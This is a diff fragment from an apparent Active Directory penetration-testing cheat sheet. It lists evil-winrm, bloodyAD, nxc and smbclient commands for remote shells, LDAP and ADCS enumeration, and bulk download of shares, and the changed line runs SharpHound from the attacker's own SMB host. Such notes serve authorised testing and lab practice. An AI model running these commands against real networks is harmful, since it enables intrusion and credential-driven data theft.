@@ -232,7 +232,7 @@ evil-winrm-py -i $TARGET -k --no-pass --spn-prefix ldap   # cifs, host, http
 evil-winrm-py -i $DC -r $DOM
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(description=*))" --attr description
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --bloodhound --use-kcache
-//$TARGET/$/Sharphound.exe --ldapusername $USERNAME --ldappassword $PASSWORD
+//$MYIP/$/Sharphound.exe --ldapusername '$USERNAME' --ldappassword '$PASSWORD'
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M adcs --use-kcache
 nxc smb $TARGET -u '$USERNAME' -p '$PASSWORD' --shares --use-kcache
 mkdir smb; smbclient //$TARGET/SHARE_NAME -U '$USERNAME'%'$PASSWORD' -D . -c 'lcd smb; recurse; prompt; mget *'
